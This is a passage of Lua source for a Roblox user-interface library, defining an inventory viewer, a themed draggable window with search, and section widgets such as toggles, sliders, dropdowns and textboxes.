                        Value:Tween(nil, {TextTransparency = 1})
                    elseif Value.Instance:IsA("UIStroke") then
                        Value:Tween(nil, {Transparency = 1})
                    end
                end

                Items["Notification"]:Tween(nil, {Size = UDim2New(0, 0, 0, 0)})
                task.wait(0.5)
                Items["Notification"]:Clean()
            end)
        end)
    end

    Library.InventoryViewer = function(self)
        local Viewer = { }
        Viewer.Items = { } 

        local Items = { } do
            Items["InventoryViewer"] = Instances:Create("Frame", {
                Parent = Library.Holder.Instance,
                Name = "\0",
                Position = UDim2New(0.007766990456730127, 0, 0.11442785710096359, 0),
                BorderColor3 = FromRGB(12, 12, 12),
                Size = UDim2New(0, 325, 0, 277),
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["InventoryViewer"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

            Instances:Create("UIStroke", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                Color = FromRGB(42, 49, 45),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Outline"})

            Items["Title"] = Instances:Create("TextLabel", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "Inventory",
                Size = UDim2New(0, 0, 0, 15),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 8, 0, 4),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Title"]:AddToTheme({TextColor3 = "Text"})

            Items["Tools"] = Instances:Create("Frame", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                Position = UDim2New(0, 8, 0, 27),
                BorderColor3 = FromRGB(42, 49, 45),
                Size = UDim2New(1, -16, 1, -108),
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(20, 24, 21)
            })  Items["Tools"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Outline"})

            Instances:Create("UIStroke", {
                Parent = Items["Tools"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Border"})

            Items["Holder"] = Instances:Create("ScrollingFrame", {
                Parent = Items["Tools"].Instance,
                Name = "\0",
                Active = true,
                AutomaticCanvasSize = Enum.AutomaticSize.Y,
                BorderSizePixel = 0,
                CanvasSize = UDim2New(0, 0, 0, 0),
                ScrollBarImageColor3 = FromRGB(202, 243, 255),
                MidImage = "rbxassetid://123708228368098",
                BorderColor3 = FromRGB(0, 0, 0),
                ScrollBarThickness = 2,
                Size = UDim2New(1, -4, 1, -8),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0, 4),
                BottomImage = "rbxassetid://123708228368098",
                TopImage = "rbxassetid://123708228368098",
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Holder"]:AddToTheme({ScrollBarImageColor3 = "Accent"})

            Instances:Create("UIGridLayout", {
                Parent = Items["Holder"].Instance,
                Name = "\0",
                SortOrder = Enum.SortOrder.LayoutOrder,
                CellSize = UDim2New(0, 65, 0, 65)
            })

            Instances:Create("UIPadding", {
                Parent = Items["Holder"].Instance,
                Name = "\0",
                PaddingTop = UDimNew(0, 4),
                PaddingLeft = UDimNew(0, 8)
            })

            Items["PlayerAvatar"] = Instances:Create("ImageLabel", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(42, 49, 45),
                AnchorPoint = Vector2New(0, 1),
                Image = "rbxasset://textures/ui/GuiImagePlaceholder.png",
                Position = UDim2New(0, 8, 1, -8),
                Size = UDim2New(0, 60, 0, 60),
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["PlayerAvatar"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Outline"})

            Instances:Create("UIStroke", {
                Parent = Items["PlayerAvatar"].Instance,
                Name = "\0",
                Color = FromRGB(12, 12, 12),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Outline"})
            
            Items["PlayerHealth"] = Instances:Create("TextLabel", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "Health: ",
                AnchorPoint = Vector2New(0, 1),
                Size = UDim2New(0, 0, 0, 15),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 75, 1, -55),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["PlayerHealth"]:AddToTheme({TextColor3 = "Text"})

            Items["PlayerDistance"] = Instances:Create("TextLabel", {
                Parent = Items["InventoryViewer"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "Distance:  studs",
                AnchorPoint = Vector2New(0, 1),
                Size = UDim2New(0, 0, 0, 15),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 75, 1, -35),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["PlayerDistance"]:AddToTheme({TextColor3 = "Text"})
        end

        function Viewer:SetPlayerHealth(Value)
            Items["PlayerHealth"].Instance.Text = tostring(Value)
        end

        function Viewer:SetPlayerDistance(Value)
            Items["PlayerDistance"].Instance.Text = "Distance: "..tostring(Value).." studs"
        end

        function Viewer:SetPlayer(Value)
            local PlayerAvatar, _ = Players:GetUserThumbnailAsync(Value.UserId)
            Items["PlayerAvatar"].Instance.Image = PlayerAvatar
            Items["Title"].Instance.Text = Value.Name .. "'s Inventory"
        end

        function Viewer:AddTool(Name, Image)
            local NewItem = { }

            local SubItems = { } do
                SubItems["Item"] = Instances:Create("Frame", {
                    Parent = Items["Holder"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(0, 100, 0, 100),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(20, 24, 21)
                })  SubItems["Item"]:AddToTheme({BackgroundColor3 = "Inline", BorderColor3 = "Border"})

                Instances:Create("UIStroke", {
                    Parent = SubItems["Item"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                SubItems["Image"] = Instances:Create("ImageLabel", {
                    Parent = SubItems["Item"].Instance,
                    Name = "\0",
                    ImageColor3 = FromRGB(202, 243, 255),
                    ScaleType = Enum.ScaleType.Fit,
                    BorderColor3 = FromRGB(0, 0, 0),
                    AnchorPoint = Vector2New(0.5, 0.5),
                    Image = "rbxassetid://"..Image,
                    BackgroundTransparency = 1,
                    Position = UDim2New(0.5, 0, 0.5, 0),
                    Size = UDim2New(0, 45, 0, 45),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  SubItems["Image"]:AddToTheme({ImageColor3 = "Accent"})
            end

            function NewItem:Remove()
                Viewer.Items[Name] = nil
                SubItems["Item"]:Clean()
            end

            Viewer.Items[Name] = NewItem
            return NewItem
        end

        function Viewer:RemoveAllTools()
            for Index, Value in Viewer.Items do 
                Value:Remove()
            end
        end

        return Viewer
    end

    Library.Window = function(self, Data)
        Data = Data or { }

        local Window = { 
            Logo = Data.Logo or Data.logo or "",
            FadeTime = Data.FadeTime or Data.fadetime or 0.4,
            Size = Data.Size or Data.size or UDim2New(0, 751, 0, 539),

            Pages = { },
            Items = { },

            IsOpen = false,
        }

        local Items = Components:Window({
            Parent = Library.Holder,
            Draggable = true,
            Resizeable = true,
            AnchorPoint = Vector2New(0, 0),
            Position = UDim2New(0, Camera.ViewportSize.X / 3.3, 0, Camera.ViewportSize.Y / 3.3),
            Size = Window.Size
        }) do
            Items["Side"] = Instances:Create("Frame", {
                Parent = Items["Window"].Instance,
                Name = "\0",
                Position = UDim2New(0, 12, 0, 12),
                BorderColor3 = FromRGB(42, 49, 45),
                Size = UDim2New(0, 100, 1, -24),
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(20, 24, 21)
            })  Items["Side"]:AddToTheme({BackgroundColor3 = "Inline", BorderColor3 = "Outline"})
            
            Items["Side"]:Border("Border")

            Items["Window"].Instance.Visible = false

            Items["Logo"] = Instances:Create("ImageLabel", {
                Parent = Items["Side"].Instance,
                Name = "\0",
                ImageColor3 = FromRGB(202, 243, 255),
                ScaleType = Enum.ScaleType.Fit,
                BorderColor3 = FromRGB(0, 0, 0),
                AnchorPoint = Vector2New(0.5, 0),
                Image = "rbxassetid://" .. Window.Logo,
                BackgroundTransparency = 1,
                Position = UDim2New(0.5, 0, 0, 12),
                Size = UDim2New(0, 75, 0, 75),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Logo"]:AddToTheme({ImageColor3 = "Accent"})

            Items["Search"] = Instances:Create("Frame", {
                Parent = Items["Side"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(12, 12, 12),
                AnchorPoint = Vector2New(0, 1),
                BackgroundTransparency = 0.4000000059604645,
                Position = UDim2New(0, 6, 1, -6),
                Size = UDim2New(0, 0, 0, 20),
                BorderSizePixel = 2,
                AutomaticSize = Enum.AutomaticSize.X,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["Search"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

            Items["SearchStroke"] = Items["Search"]:Border("Outline")

            Items["Icon"] = Instances:Create("ImageLabel", {
                Parent = Items["Search"].Instance,
                Name = "\0",
                ScaleType = Enum.ScaleType.Fit,
                BorderColor3 = FromRGB(0, 0, 0),
                AnchorPoint = Vector2New(0, 0.5),
                Image = "rbxassetid://71197946135150",
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0.5, 0),
                Size = UDim2New(0, 16, 0, 16),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["Input"] = Instances:Create("TextBox", {
                Parent = Items["Search"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                CursorPosition = -1,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "",
                Size = UDim2New(0, 0, 1, 0),
                Position = UDim2New(0, 22, 0, 0),
                BorderSizePixel = 0,
                BackgroundTransparency = 1,
                PlaceholderColor3 = FromRGB(185, 185, 185),
                AutomaticSize = Enum.AutomaticSize.X,
                PlaceholderText = "..",
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Input"]:AddToTheme({TextColor3 = "Text", PlaceholderColor3 = "Placeholder Text"})

            Items["Input"]:TextBorder()

            Instances:Create("UIPadding", {
                Parent = Items["Search"].Instance,
                Name = "\0",
                PaddingRight = UDimNew(0, 5),
                PaddingLeft = UDimNew(0, 3)
            })

            Items["Pages"] = Instances:Create("Frame", {
                Parent = Items["Side"].Instance,
                Name = "\0",
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0, 100),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 1, -135),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIPadding", {
                Parent = Items["Pages"].Instance,
                Name = "\0",
                PaddingRight = UDimNew(0, 8),
                PaddingLeft = UDimNew(0, 8)
            })

            Instances:Create("UIListLayout", {
                Parent = Items["Pages"].Instance,
                Name = "\0",
                Padding = UDimNew(0, 8),
                SortOrder = Enum.SortOrder.LayoutOrder
            })

            local Content, _ = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)

            Items["Avatar"] = Instances:Create("ImageLabel", {
                Parent = Items["Side"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                AnchorPoint = Vector2New(1, 1),
                Image = Content,
                BackgroundTransparency = 1,
                Position = UDim2New(1, -6, 1, -6),
                Size = UDim2New(0, 25, 0, 25),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["Avatar"]:Border("Outline").Instance.LineJoinMode = Enum.LineJoinMode.Round

            Instances:Create("UICorner", {
                Parent = Items["Avatar"].Instance,
                Name = "\0",
                CornerRadius = UDimNew(1, 0)
            })

            Items["Content"] = Instances:Create("Frame", {
                Parent = Items["Window"].Instance,
                Name = "\0",
                BackgroundTransparency = 1,
                Position = UDim2New(0, 126, 0, 12),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, -138, 1, -24),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["MouseBackground"] = Instances:Create("Frame", {
                Parent = Library.Holder.Instance,
                Name = "\0",
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0, 0),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(0, 16, 0, 16),
                BorderSizePixel = 0,
                ZIndex = 9999,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Items["MouseImage"] = Instances:Create("ImageLabel", {
                Parent = Items["MouseBackground"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Image = "rbxassetid://76631660114196",
                BackgroundTransparency = 1,
                Size = UDim2New(1, 0, 1, 0),
                BorderSizePixel = 0,
                ZIndex = 9999,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["MouseImage"]:AddToTheme({ImageColor3 = "Accent"})

            Instances:Create("UIGradient", {
                Parent = Items["MouseImage"].Instance,
                Name = "\0",
                Rotation = 90,
                Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(99, 108, 117))}
            })

            UserInputService.MouseIconEnabled = false

            Window.Items = Items
        end

        local Debounce = false

        Items["Input"]:Connect("Focused", function()
            Items["Search"]:Tween(nil, {BackgroundTransparency = 0})
            Items["SearchStroke"]:Tween(nil, {Transparency = 0})
        end)

        Items["Input"]:Connect("FocusLost", function()
            Items["Search"]:Tween(nil, {BackgroundTransparency = 0.4})
            Items["SearchStroke"]:Tween(nil, {Transparency = 0.4})
        end)

        Items["Input"]:OnHover(function()
            Items["Search"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
            Items["Search"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
        end)

        Items["Input"]:OnHoverLeave(function()
            Items["Search"]:ChangeItemTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})
            Items["Search"]:Tween(nil, {BackgroundColor3 = Library.Theme.Background})
        end)

        Library:Connect(RunService.RenderStepped, function()
            local MouseLocation = UserInputService:GetMouseLocation() 
            Items["MouseBackground"].Instance.Position = UDim2New(0, MouseLocation.X - 1, 0, MouseLocation.Y - 56)           
        end)

        local OldSizes = { }

        function Window:AddToOldSizes(Item, Size)
            if not OldSizes[Item] then
                OldSizes[Item] = Size
            end
        end

        function Window:GetOldSize(Item)
            if OldSizes[Item] then
                return OldSizes[Item]
            end
        end

        function Window:SetOpen(Bool)
            if Debounce then 
                return
            end

            Window.IsOpen = Bool

            Debounce = true 

            if Window.IsOpen then 
                Items["Window"].Instance.Visible = true 
            end

            local Descendants = Items["Window"].Instance:GetDescendants()
            TableInsert(Descendants, Items["Window"].Instance)

            local NewTween

            for Index, Value in Descendants do 
                local TransparencyProperty = Tween:GetProperty(Value)

                if not TransparencyProperty then
                    continue 
                end

                if type(TransparencyProperty) == "table" then 
                    for _, Property in TransparencyProperty do 
                        NewTween = Tween:FadeItem(Value, Property, Bool, Library.FadeSpeed)
                    end
                else
                    NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Library.FadeSpeed)
                end
            end
            
            NewTween.Tween.Completed:Connect(function()
                Debounce = false 
                Items["Window"].Instance.Visible = Window.IsOpen
                if Window.IsOpen then
                    Items["MouseBackground"].Instance.Visible = true
                    UserInputService.MouseIconEnabled = false
                else
                    Items["MouseBackground"].Instance.Visible = false
                    UserInputService.MouseIconEnabled = true
                end
            end)
        end

        Library:Connect(UserInputService.InputBegan, function(Input)
            if tostring(Input.KeyCode) == Library.MenuKeybind or tostring(Input.UserInputType) == Library.MenuKeybind then
                Window:SetOpen(not Window.IsOpen)
            end
        end)

        local SearchStepped

        Items["Input"]:Connect("Focused", function()
            local PageSearchData = Library.SearchItems[Library.CurrentPage]

            if not PageSearchData then
                return 
            end

            SearchStepped = RunService.RenderStepped:Connect(function()
                for Index, Value in PageSearchData do 
                    local Name = Value.Name
                    local Element = Value.Element

                    if StringFind(StringLower(Name), StringLower(Items["Input"].Instance.Text)) then
                        if Items["Input"].Instance.Text ~= "" then 
                            Element.Instance.Visible  = true 
                            Element:Tween(TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Window:GetOldSize(Element)})
                        else
                            Element.Instance.Visible  = true 
                            Element:Tween(TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Window:GetOldSize(Element)})
                        end
                    else
                        Window:AddToOldSizes(Element, Element.Instance.Size)
                        Element:Tween(TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2New(Window:GetOldSize(Element).X.Scale, Window:GetOldSize(Element).X.Offset, 0, 0)})
                        task.wait(0.1)
                        Element.Instance.Visible = false
                    end
                end
            end)
        end)

        Items["Input"]:Connect("FocusLost", function()
            if SearchStepped then 
                SearchStepped:Disconnect()
                SearchStepped = nil
            end
        end)

        Window:SetOpen(true)
        return setmetatable(Window, self)
    end

    Library.Page = function(self, Data)
        Data = Data or { }

        local Page = {
            Window = self,

            Name = Data.Name or Data.name or "Page",
            Columns = Data.Columns or Data.columns or 2,
            SubPages = Data.SubPages or Data.subpages or false,
        }

        Library.SearchItems[Page] = { }

        local NewPage, Items = Components:WindowPage({
            Name = Page.Name,
            ContentHolder = Page.Window.Items["Content"],
            Stack = Page.Window.Pages,
            Parent = Page.Window.Items["Pages"],
            Columns = Page.Columns,
            SubPages = Page.SubPages,
            FadeTime = Page.Window.FadeTime,
            Window = Page.Window
        })

        return setmetatable(NewPage, Library.Pages)
    end

    Library.Pages.SubPage = function(self, Data)
        Data = Data or { }

        local SubPage = {
            Window = self.Window,
            Page = self,

            Name = Data.Name or Data.name or "SubPage",
            Columns = Data.Columns or Data.columns or 2,
        }

        Library.SearchItems[SubPage] = { }

        local NewSubPage, Items = Components:WindowSubPage({
            Page = SubPage.Page,
            Name = SubPage.Name,
            Columns = SubPage.Columns,
            Window = SubPage.Page.Window
        })

        return setmetatable(NewSubPage, Library.Pages)
    end

    Library.Pages.Section = function(self, Data)
        Data = Data or { }

        local Section = {
            Window = self.Window,
            Page = self,

            Name = Data.Name or Data.name or "Section",
            Side = Data.Side or Data.side or 1,

            Items = { }
        }

        local Items = { } do
            Items["Section"] = Instances:Create("Frame", {
                Parent = Section.Page.ColumnsData[Section.Side].Instance,
                Name = "\0",
                Size = UDim2New(1, 0, 0, 25),
                BorderColor3 = FromRGB(42, 49, 45),
                BorderSizePixel = 2,
                AutomaticSize = Enum.AutomaticSize.Y,
                BackgroundColor3 = FromRGB(20, 24, 21)
            })  Items["Section"]:AddToTheme({BackgroundColor3 = "Inline", BorderColor3 = "Outline"})

            Items["Section"]:Border("Border")

            Items["Liner"] = Instances:Create("Frame", {
                Parent = Items["Section"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, 1),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(202, 243, 255)
            })  Items["Liner"]:AddToTheme({BackgroundColor3  = "Accent"})

            Items["Glow"] = Instances:Create("Frame", {
                Parent = Items["Section"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, 15),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(202, 243, 255)
            })  Items["Glow"]:AddToTheme({BackgroundColor3  = "Accent"})

            Instances:Create("UIGradient", {
                Parent = Items["Glow"].Instance,
                Name = "\0",
                Rotation = 90,
                Transparency = NumSequence{NumSequenceKeypoint(0, 0), NumSequenceKeypoint(0.193, 0.8687499761581421), NumSequenceKeypoint(0.504, 0.96875), NumSequenceKeypoint(1, 1)}
            })

            Items["Text"] = Instances:Create("TextLabel", {
                Parent = Items["Section"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = Section.Name,
                Size = UDim2New(0, 0, 0, 15),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 6, 0, 5),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

            Items["Text"]:TextBorder()

            Instances:Create("UIPadding", {
                Parent = Items["Section"].Instance,
                Name = "\0",
                PaddingBottom = UDimNew(0, 8)
            })

            Items["Content"] = Instances:Create("Frame", {
                Parent = Items["Section"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 10, 0, 26),
                Size = UDim2New(1, -20, 0, 0),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.Y,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIListLayout", {
                Parent = Items["Content"].Instance,
                Name = "\0",
                Padding = UDimNew(0, 8),
                SortOrder = Enum.SortOrder.LayoutOrder
            })

            Section.Items = Items
        end

        return setmetatable(Section, Library.Sections)
    end
    
    Library.Sections.Toggle = function(self, Data)
        Data = Data or { }

        local Toggle = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Data.Name or Data.name or "Toggle",
            Flag = Data.Flag or Data.flag or Library:NextFlag(),
            Default = Data.Default or Data.default or false,
            Callback = Data.Callback or Data.callback or function() end
        }

        local NewToggle, ToggleItems = Components:Toggle({
            Name = Toggle.Name,
            Parent = Toggle.Section.Items["Content"],
            Flag = Toggle.Flag,
            Default = Toggle.Default,
            Page = Toggle.Page,
            Callback = Toggle.Callback
        })

        function NewToggle:Colorpicker(Data)
            local Colorpicker = {
                Window = self.Window,
                Page = self.Page,
                Section = self,

                Flag = Data.Flag or Data.flag or Library:NextFlag(),
                Default = Data.Default or Data.default or Color3.fromRGB(255, 255, 255),
                Callback = Data.Callback or Data.callback or function() end,
                Alpha = Data.Alpha or Data.alpha or 0,
            }

            local NewColorpicker, ColorpickerItems = Components:Colorpicker({
                Name = Colorpicker.Name,
                Parent = ToggleItems["SubElements"],
                Pages = true,
                Page = Colorpicker.Page,
                Flag = Colorpicker.Flag,
                Default = Colorpicker.Default,
                Alpha = Colorpicker.Alpha,
                Callback = Colorpicker.Callback,
            })

            return NewColorpicker
        end

        function NewToggle:Keybind(Data)
            Data = Data or { }

            local Keybind = {
                Window = self.Window,
                Page = self.Page,
                Section = self.Section,

                Flag = Data.Flag or Data.flag or Library:NextFlag(),
                Default = Data.Default or Data.default or Enum.KeyCode.RightShift,
                Callback = Data.Callback or Data.callback or function() end,
                Mode = Data.Mode or Data.mode or "Toggle",
            }

            local NewKeybind, KeybindItems = Components:Keybind({
                Name = Toggle.Name,
                Parent = ToggleItems["SubElements"],
                Page = Keybind.Page,
                Flag = Keybind.Flag,
                Default = Keybind.Default,
                Mode = Keybind.Mode,
                Callback = Keybind.Callback
            })

            return NewKeybind
        end

        return NewToggle
    end

    Library.Sections.Button = function(self)
        local Button = {
            Window = self.Window,
            Page = self.Page,
            Section = self
        }

        local NewButton, ButtonItems = Components:Button({
            Parent = Button.Section.Items["Content"],
            Page = Button.Page
        })

        return NewButton
    end

    Library.Sections.Slider = function(self, Data)
        Data = Data or { }
        
        local Slider = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Data.Name or Data.name or "Slider",
            Flag = Data.Flag or Data.flag or Library:NextFlag(),
            Min = Data.Min or Data.min or 0,
            Decimals = Data.Decimals or Data.decimals or 1,
            Suffix = Data.Suffix or Data.suffix or "",
            Max = Data.Max or Data.max or 100,
            Default = Data.Default or Data.Default or 0,
            Callback = Data.Callback or Data.callback or function() end,
        }

        local NewSlider, SliderItems = Components:Slider({
            Name = Slider.Name,
            Parent = Slider.Section.Items["Content"],
            Flag = Slider.Flag,
            Min = Slider.Min,
            Page = Slider.Page,
            Decimals = Slider.Decimals,
            Suffix = Slider.Suffix,
            Max = Slider.Max,
            Default = Slider.Default,
            Callback = Slider.Callback,
        })

        local PageSearchData = Library.SearchItems[Slider.Page]

        if PageSearchData then
            local SearchData = {
                Element = SliderItems["Slider"],
                Name = Slider.Name,
            }

            TableInsert(PageSearchData, SearchData)
        end

        return NewSlider 
    end

    Library.Sections.Dropdown = function(self, Data)
        Data = Data or { }

        local Dropdown = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Data.Name or Data.name or "Dropdown",
            Flag = Data.Flag or Data.flag or Library:NextFlag(),
            Items = Data.Items or Data.items or { },
            Default = Data.Default or Data.default or nil,
            Multi = Data.Multi or Data.multi or false,
            Callback = Data.Callback or Data.callback or function() end            
        }

        local NewDropdown, DropdownItems = Components:Dropdown({
            Name = Dropdown.Name,
            Parent = Dropdown.Section.Items["Content"],
            Flag = Dropdown.Flag,
            Items = Dropdown.Items,
            Page = Dropdown.Page,
            Default = Dropdown.Default,
            Multi = Dropdown.Multi,
            Callback = Dropdown.Callback,
        })

        local PageSearchData = Library.SearchItems[Dropdown.Page]

        if PageSearchData then
            local SearchData = {
                Element = DropdownItems["Dropdown"],
                Name = Dropdown.Name,
            }

            TableInsert(PageSearchData, SearchData)
        end

        return NewDropdown 
    end

    Library.Sections.Label = function(self, Name)
        local Label = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Name or "Label"
        }

        local NewLabel, LabelItems = Components:Label({
            Name = Label.Name,
            Parent = Label.Section.Items["Content"],
            Page = Label.Page,
        })

        function NewLabel:Colorpicker(Data)
            Data = Data or { }

            local Colorpicker = {
                Window = self.Window,
                Page = self.Page,
                Section = self.Section,

                Flag = Data.Flag or Data.flag or Library:NextFlag(),
                Default = Data.Default or Data.default or Color3.fromRGB(255, 255, 255),
                Callback = Data.Callback or Data.callback or function() end,
                Alpha = Data.Alpha or Data.alpha or 0,
            }

            local NewColorpicker, ColorpickerItems = Components:Colorpicker({
                Name = Colorpicker.Name,
                Parent = LabelItems["SubElements"],
                Pages = true,
                Page = Colorpicker.Page,
                Flag = Colorpicker.Flag,
                Default = Colorpicker.Default,
                Alpha = Colorpicker.Alpha,
                Callback = Colorpicker.Callback,
            })

            return NewColorpicker
        end

        function NewLabel:Keybind(Data)
            Data = Data or { }

            local Keybind = {
                Window = self.Window,
                Page = self.Page,
                Section = self.Section,

                Flag = Data.Flag or Data.flag or Library:NextFlag(),
                Default = Data.Default or Data.default or Enum.KeyCode.RightShift,
                Callback = Data.Callback or Data.callback or function() end,
                Mode = Data.Mode or Data.mode or "Toggle",
            }

            local NewKeybind, KeybindItems = Components:Keybind({
                Name = Label.Name,
                Parent = LabelItems["SubElements"],
                Page = Keybind.Page,
                Flag = Keybind.Flag,
                Default = Keybind.Default,
                Mode = Keybind.Mode,
                Callback = Keybind.Callback
            })

            return NewKeybind
        end

        local PageSearchData = Library.SearchItems[Label.Page]

        if PageSearchData then
            local SearchData = {
                Element = LabelItems["Label"],
                Name = Label.Name,
            }

            TableInsert(PageSearchData, SearchData)
        end

        return NewLabel
    end

    Library.Sections.Textbox = function(self, Data)
        Data = Data or { }

        local Textbox = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Data.Name or Data.name or "Textbox",
            Flag = Data.Flag or Data.flag or Library:NextFlag(),
            Default = Data.Default or Data.default or "",
            Numeric = Data.Numeric or Data.numeric or false,
            Finished = Data.Finished or Data.finished or false,
            Placeholder = Data.Placeholder or Data.placeholder or "...",
            Callback = Data.Callback or Data.callback or function() end,
        }

        local NewTextbox, TextboxItems = Components:Textbox({
            Name = Textbox.Name,
            Placeholder = Textbox.Placeholder,
            Parent = Textbox.Section.Items["Content"],
            Flag = Textbox.Flag,
            Page = Textbox.Page,
            Default = Textbox.Default,
            Numeric = Textbox.Numeric,
            Finished = Textbox.Finished,
            Callback = Textbox.Callback,
        })

        local PageSearchData = Library.SearchItems[Textbox.Page]

        if PageSearchData then
            local SearchData = {
                Element = TextboxItems["Textbox"],
                Name = Textbox.Name,
            }

            TableInsert(PageSearchData, SearchData)
        end

        return NewTextbox
    end

    Library.Sections.Searchbox = function(self, Data)
        Data = Data or { }

        local Searchbox = {
            Window = self.Window,
            Page = self.Page,
            Section = self,

            Name = Data.Name or Data.name or "Searchbox",
            Flag = Data.Flag or Data.flag or Library:NextFlag(),
            Items = Data.Items or Data.items or { },
            Default = Data.Default or Data.default or nil,
            Multi = Data.Multi or Data.multi or false,
            Callback = Data.Callback or Data.callback or function() end            
        }

        local NewSearchbox, SearchboxItems = Components:Searchbox({
            Parent = Searchbox.Section.Items["Content"],
            Flag = Searchbox.Flag,
            Items = Searchbox.Items,
